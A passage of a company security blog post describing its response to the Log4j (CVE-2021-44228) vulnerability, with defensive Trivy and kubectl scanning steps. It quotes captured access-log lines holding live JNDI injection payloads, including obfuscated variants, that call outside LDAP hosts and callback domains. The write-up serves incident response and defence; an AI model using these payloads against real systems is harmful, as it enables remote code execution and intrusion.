party service using <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer">Interactsh</a>.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token number" style="color:rgb(247, 140, 108)">16</span><span class="token plain">/Dec/2021:06:11:07 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET /?x=</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">j}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">n}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">i}</span><span class="token string" style="color:rgb(195, 232, 141)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">685</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.015</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">products-developer-portal-8080</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.98</span><span class="token plain">.133.224:8080 </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.014</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> 548d1132926fa0bc9904e12523d2f250 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">l}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">d}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">a}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">p}</span><span class="token plain">://</span><span class="token variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token plain">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">, </span><span class="token number" style="color:rgb(247, 140, 108)">173.249</span><span class="token plain">.19.100</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-14T22:57:36.722Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET / HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;51.105.55.17&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.83.193.150</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">1389</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Exploit}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;7c9223d6-2c81-491d-8564-10742cc90a9c&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;54.75.196.220&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;-&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In our Tokyo region, we started to see a lot of requests from <code>x00.it</code> domain.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">14</span><span class="token plain">/Dec/2021:17:37:59 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&amp;page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&amp;search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_Referer.log4jdns.x00.it/}&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_User-Agent.log4jdns.x00.it/}&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">4496</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.255</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">monitoring-mki-lab-grafana-80</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.115</span><span class="token plain">.164.63:3000 </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.001</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> d7fa702ee8cc73793707ca6720c57639 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">194.5</span><span class="token plain">.73.6</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.</p><h1>Monday</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="docker-vulnerability-scans">Docker Vulnerability Scans<a class="hash-link" href="#docker-vulnerability-scans" title="Direct link to heading">​</a></h2><p>Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from <a href="https://github.com/cisagov/log4j-affected-db" target="_blank" rel="noopener noreferrer">this resource</a> that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with <a href="https://github.com/kubernetes/kubectl" target="_blank" rel="noopener noreferrer">kubectl</a> and <a href="https://github.com/aquasecurity/trivy" target="_blank" rel="noopener noreferrer">Trivy</a>, a scanner for vulnerabilities in container images.</p><p>First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ brew </span><span class="token function" style="color:rgb(130, 170, 255)">install</span><span class="token plain"> aquasecurity/trivy/trivy</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ trivy image birdyman/log4j2-demo:1.0.0-12 </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> CVE-2021-44228</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> org.apache.logging.log4j:log4j-api                     </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CVE-2021-44228   </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CRITICAL </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.10</span><span class="token plain">.0            </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.15</span><span class="token plain">.0                         </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> Remote code injection </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> Log4j                                                  </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Now that we know Trivy works, let’s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.</p><p><code>trivy-scan-cve.sh CVE-2021-44228</code></p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">VULN</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;Scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">imgs</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">kubectl get pods -A -o </span><span class="token variable assign-left variable" style="color:rgb(191, 199, 213)">jsonpath</span><span class="token variable operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable string" style="color:rgb(195, 232, 141)">&#x27;{range .items[*]}{.spec.containers[*].image}{&quot; &quot;}&#x27;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">tr</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot; &quot;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token variable string entity" style="color:rgb(195, 232, 141)">\n</span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">sort</span><span class="token variable" style="color:rgb(191, 199, 213)"> -u</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(191, 199, 213)">img</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${imgs}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">result</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">trivy image --severity CRITICAL $</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token variable" style="color:rgb(191, 199, 213)">img</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${result}</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> -q </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> -e </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)"> is vulnerable, please patch!&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">done</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="monitoring-vendors">Monitoring Vendors<a class="hash-link" href="#monitoring-vendors" title="Direct link to heading">​</a></h2><p>It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.</p><h1>What worked well and could be improved</h1><p>During this incident management we have gathered great learnings in the way.</p><p>First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.</p><p>Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.</p><h1>Staying secure</h1><p>All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.</p><h1>We are hiring</h1><p>If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. <a href="https://wgtwo.jobs.personio.de/job/423396?display=en" target="_blank" rel="noopener noreferrer">https://wgtwo.jobs.personio.de/job/423396?display=en</a></p></div><footer class="row docusaurus-mt-lg blogPostDetailsFull_h6_j"><div class="col"><b>Tags:</b><ul class="tags_XVD_ padding--none margin-left--sm"><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/security/">security</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/infrastructure/">infrastructure</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/vulnerability/">vulnerability</a></li></ul></div><div class="col margin-top--sm"><a href="https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-17-log4j-security-vulnerability.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_dcUD" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/blog/the-specs-behind-the-specs-part-1/"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">The specs behind the specs part 1</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/blog/ckh-iod-wg2-public-cloud/"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">CKH IOD selects Working Group Two for public cloud core network</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_cNA8 thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#code" class="table-of-contents__link toc-highlight">Code</a></li><li><a href="#docker-vulnerability-scan-day-1" class="table-of-contents__link toc-highlight">Docker Vulnerability Scan Day 1</a></li><li><a href="#checking-our-infrastructure-ourselves-with-dns-requests" class="table-of-contents__link toc-highlight">Checking our infrastructure ourselves with DNS requests</a></li><li><a href="#log-analysis-and-alerting" class="table-of-contents__link toc-highlight">Log Analysis and Alerting</a></li><li><a href="#docker-vulnerability-scans" class="table-of-contents__link toc-highlight">Docker Vulnerability Scans</a></li><li><a href="#monitoring-vendors" class="table-of-contents__link toc-highlight">Monitoring Vendors</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title"></div><ul class="footer__items"><li class="footer__item"><a href="/"><img alt="wgtwo Logo" src="/img/logo_white.svg" width="281px" height="32px" class="footer-logo"></a></li></ul></div><div class="col footer__col"><div class="footer__title">Product</div><ul class="footer__items"><li class="footer__item"><a href="https://docs.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>API Docs<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://console.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Console Login<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://support.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Customer Support<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">Company</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" target="_self" href="/docs/about/introduction/">About</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/blog/">Blog</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/docs/case-studies/mvnx/">Case Studies</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/team/">Team</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/careers/">Careers</a></li><li class="footer__item"><a href="https://gk.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>gk.wgtwo.com 合同会社<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">Security</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" target="_self" href="/security/">Security Overview</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/docs/technology/security-whitepaper/">Security Whitepaper</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/privacy/">Privacy Policy</a></li></ul></div><div class="col footer__col"><div class="footer__title">Connect</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" target="_self" href="/docs/about/media-and-analysts/">Media &amp; Analysts</a></li><li class="footer__item"><a href="https://twitter.com/workinggrouptwo" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://github.com/working-group-two" target="_blank" rel="noopener noreferrer" 